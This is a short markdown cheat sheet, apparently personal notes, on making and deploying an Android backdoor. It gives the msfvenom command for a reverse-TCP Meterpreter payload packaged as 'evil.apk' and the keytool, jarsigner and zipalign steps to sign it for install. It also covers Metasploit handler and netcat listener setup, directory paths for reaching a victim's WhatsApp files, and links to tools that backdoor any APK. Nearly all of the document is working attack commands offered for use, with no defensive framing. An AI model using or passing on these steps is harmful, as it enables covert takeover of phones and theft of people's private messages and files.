# Notes

## generate backdoor .apk
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=localhost LPORT=4444 R > evil.apk
```

## sign .apk
```bash
# generate keystore
keytool -genkey -v -keystore key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias alias

# sign .apk
jarsigner -keystore key.jks -keypass <your-password> evil.apk <your-alias>

# align .apk
zipalign -v 4 evil.apk evil-signed.apk
```

## exploit
```bash
msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST localhost
set LPORT 4444
exploit

help
```

## listen from netcat
```bash
nc -nlvp 443
```

## list payloads
```bash
msfvenom -l payloads | grep -i "android"
```

### usefull paths
```bash
# sdcard files
cd /sdcard/
# whatsapp files
cd /sdcard/Whatsapp/
```
## backdoor in any .apk
("Source code")[https://github.com/dana-at-cp/backdoor-apk]

## fixed backdoor .apk source code
("Fixed .apk")[https://github.com/giovannicolonna/msfvenom-backdoor-android/]

